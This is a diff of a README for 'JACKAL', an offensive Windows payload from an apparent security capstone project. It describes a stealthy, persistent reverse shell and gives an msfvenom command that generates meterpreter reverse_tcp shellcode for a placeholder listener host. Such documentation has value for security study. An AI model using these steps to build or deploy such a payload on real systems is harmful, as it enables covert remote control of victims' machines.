@@ -1,4 +1,9 @@
 # Windows Payload: JACKAL
+
+### Source Code
+
+* https://github.com/Nekrosis-ISS-Capstone/JACKAL
+
 ### Description
 
 This documentation outlines the functionality and implementation details of "JACKAL", a Windows payload designed to establish a persistent reverse shell on a target system. The payload is designed to work in conjunction with the nekrosis framework, leveraging advanced techniques for stealth and evasion.
@@ -15,7 +20,7 @@ Once the target process is running, the payload locates the address of the WinAP
 
 ### Preparation and Compilation
 
-To ensure a connection can be established to your machine for the reverse shell, a generated payload has to be inserted in the payload array located in payload.cpp. A payload can be generated using msfvenom: 
+To ensure a connection can be established to your machine for the reverse shell, a generated payload has to be inserted in the payload array located in payload.cpp. A payload can be generated using msfvenom:
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={listener IP} LPORT={listener port} -f c
 ```
